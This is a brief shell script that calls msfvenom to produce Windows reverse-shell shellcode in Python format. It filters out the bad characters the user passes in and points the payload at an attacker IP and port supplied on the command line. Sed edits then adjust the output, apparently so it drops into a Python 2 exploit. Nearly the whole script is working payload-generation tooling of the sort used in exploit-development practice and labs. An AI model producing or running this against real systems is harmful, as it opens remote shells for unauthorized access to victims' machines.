# USAGE: ./shellcode.sh '\x00\x0A\x0D' 192.168.57.101 4444

bad="'$1'"
echo $bad
ip=$2
port=$3
echo $2:$3

msfvenom -p windows/shell_reverse_tcp -b "'$bad'" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread > shellcode.py
sed -i 's/=  b\"/=  \"/g' shellcode.py
sed -i 's/= b\"/= \"/g' shellcode.py
